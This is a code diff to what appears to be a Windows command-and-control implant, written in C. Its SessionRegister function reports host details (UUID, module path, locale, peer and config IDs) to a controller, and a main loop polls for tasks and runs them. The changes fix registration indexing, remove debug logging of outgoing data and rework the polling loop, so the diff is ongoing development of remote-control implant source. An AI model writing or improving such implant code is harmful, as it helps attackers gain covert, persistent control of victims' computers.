@@ -50,7 +50,7 @@ BOOL SessionRegister
 	CHAR szOsName[] = "windows";
 
 	PPBElement pFinalElement = NULL;
-	PPBElement ElementList[17];
+	PPBElement ElementList[18];
 	ENVELOPE RegisterEnvelope;
 
 	lpUUID = GetHostUUID();
@@ -127,11 +127,12 @@ BOOL SessionRegister
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
 	ElementList[12] = CreateVarIntElement(pSession->pGlobalConfig->dwReconnectInterval, 13);
-	ElementList[14] = CreateBytesElement(pSession->pGlobalConfig->szConfigID, lstrlenA(pSession->pGlobalConfig->szConfigID), 16);
-	ElementList[15] = CreateVarIntElement(pSession->pGlobalConfig->uPeerID, 17);
-	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
+	ElementList[15] = CreateBytesElement(pSession->pGlobalConfig->szConfigID, lstrlenA(pSession->pGlobalConfig->szConfigID), 16);
+	ElementList[16] = CreateVarIntElement(pSession->pGlobalConfig->uPeerID, 17);
+	ElementList[17] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
 	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
+	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 	RegisterEnvelope.pData = ALLOC(sizeof(BUFFER));
 	RegisterEnvelope.pData->pBuffer = pFinalElement->pMarshalledData;
 	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
@@ -202,8 +203,6 @@ VOID SessionWork
 	pSendEnvelope = SystemTaskHandler(pRecvEnvelope);
 
 	pSession = pWrapper->pSession;
-	PrintFormatA("Send Envelope:\n");
-	HexDump(pSendEnvelope->pData->pBuffer, pSendEnvelope->pData->cbBuffer);
 	if (!pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pSendEnvelope)) {
 		goto CLEANUP;
 	}
@@ -259,8 +258,13 @@ VOID SessionMainLoop
 		pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
 		if (pEnvelope == NULL) {
 			dwNumberOfAttempts++;
-			Sleep(pSession->dwPollInterval * 1000);
-			continue;
+			goto SLEEP;
+		}
+
+		dwNumberOfAttempts = 0;
+		if (pEnvelope->uType == 0) {
+			FreeEnvelope(pEnvelope);
+			goto SLEEP;
 		}
 
 		PrintFormatW(L"Receive Envelope:\n");
@@ -275,6 +279,7 @@ VOID SessionMainLoop
 		}
 
 		TpPostWork(pWork);
+SLEEP:
 		Sleep(pSession->dwPollInterval * 1000);
 	}
 
